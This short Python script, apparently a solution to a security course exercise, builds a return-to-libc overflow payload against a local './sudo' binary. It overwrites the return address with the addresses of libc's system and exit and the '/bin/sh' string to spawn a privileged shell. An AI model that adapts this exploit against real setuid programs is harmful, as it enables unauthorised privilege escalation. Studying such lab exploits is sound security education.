import os, sys
import addresses
import struct


PATH_TO_SUDO = './sudo'
EXIT_CODE = 0x42


def get_arg():
    # NOTES:
    # 1. Use `addresses.SYSTEM` to get the address of the `system` function
    # 2. Use `addresses.LIBC_BIN_SH` to get the address of the "/bin/sh" string
    # 3. Use `addresses.EXIT` to get the address of the `exit` function
    buff = 'a' * (0x49 - len("thisisasalt"))
    old_ebp = 'b' * 4
    bin_sh_add = addresses.address_to_bytes(addresses.LIBC_BIN_SH)
    system_libc_add = addresses.address_to_bytes(addresses.SYSTEM)
    exit_add = addresses.address_to_bytes(addresses.EXIT)
    exit_status = 0x42 # now it does matter, we want here the address of the "exit" call
    password = buff + old_ebp + system_libc_add + exit_add + bin_sh_add + struct.pack("B", exit_status)
    return password


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
